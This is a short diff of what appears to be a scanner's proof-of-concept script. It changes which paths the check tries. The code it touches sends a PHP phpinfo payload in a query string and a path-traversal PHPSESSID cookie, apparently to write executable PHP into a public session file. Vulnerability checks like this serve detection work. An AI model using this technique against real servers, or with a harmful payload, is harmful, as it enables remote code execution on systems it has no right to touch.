@@ -21,13 +21,9 @@ class POC(Script):
     async def prove(self):
         await self.get_url()
         if self.base_url:
-            path_list = list(set([
-                self.url_normpath(self.base_url, '/'),
-                self.url_normpath(self.url, './'),
-            ]))
             random_str = str(random.randint(100000, 999999)) + '.php'
             async with ClientSession() as session:
-                for path in path_list:
+                for path in self.url_normpath(self.url, ['./public/', './']):
                     url1 = path + 'index?test=<?php%20phpinfo();?>//'
                     headers = {'Cookie': 'PHPSESSID=../../../../public/' + random_str}
                     async with session.get(url=url1, headers=headers) as res1:
